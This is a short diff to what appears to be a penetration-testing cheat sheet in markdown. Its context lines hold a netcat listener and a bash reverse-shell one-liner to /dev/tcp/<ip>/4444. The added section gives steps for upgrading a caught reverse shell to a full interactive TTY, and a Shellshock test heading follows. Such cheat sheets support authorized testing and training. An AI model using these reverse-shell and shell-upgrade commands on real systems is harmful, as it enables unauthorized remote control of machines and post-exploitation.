@@ -24,6 +24,15 @@ On your machine: `nc -lvp <port no>`
 #### Bash reverse shell
 
       bash -i >& /dev/tcp/<ip>/4444 0>&1
+
+### Upgrade shell to full tty
+      SHELL=/bin/bash script -q /dev/null
+      Ctrl-Z
+      stty raw -echo
+      fg
+      reset
+      xterm
+      
 #### Bash shellshock
 
 Test if vulnerable:
